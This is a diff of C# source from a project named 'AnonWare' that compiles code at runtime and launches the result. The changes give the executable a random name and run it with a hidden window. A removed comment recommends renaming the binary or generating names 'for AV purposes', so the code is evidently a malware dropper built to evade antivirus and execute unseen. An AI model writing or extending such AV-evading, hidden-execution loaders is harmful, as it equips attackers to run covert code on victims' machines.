@@ -24,11 +24,11 @@ using System.CodeDom.Compiler;
 using System.Net;
 using System.IO;
 
-namespace AnonWare_CSharp
+namespace AnonWare
 {
-    class regProgram
+    class Program
     {
-        static void MainTest()
+        static void MainREMOVETHIS()
         {
             compile();
         }
@@ -41,7 +41,7 @@ namespace AnonWare_CSharp
                 CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
                 ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
                 String[] referenceAssemblies = { "System.dll" }; //if you plan to do more than really simple stuff with it, add stuff to this list (seperate them with commas)
-                string myAssemblyName = "assemble.exe";
+                string myAssemblyName = GetPassword() + ".exe";
                 CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
                 myCompilerParameters.GenerateExecutable = true;
                 myCompilerParameters.GenerateInMemory = true;
@@ -55,7 +55,10 @@ namespace AnonWare_CSharp
                     z.Close();
                     y.Close();
                     CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, source);
-                    Process.Start("assemble.exe"); //for AV purposes, it's recommended that you change the name of this, or even make the name self-creating (see 'for all your randomness needs' below) ^_^
+                    Process cmd = new Process();
+                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    cmd.StartInfo.FileName = myAssemblyName;
+                    cmd.Start();
                 }
                 else
                 {
@@ -93,7 +96,9 @@ namespace AnonWare_CSharp
                 builder.Append(ch);
             }
             if (lowerCase)
+            {
                 return builder.ToString().ToLower();
+            }
             return builder.ToString();
         }
     }
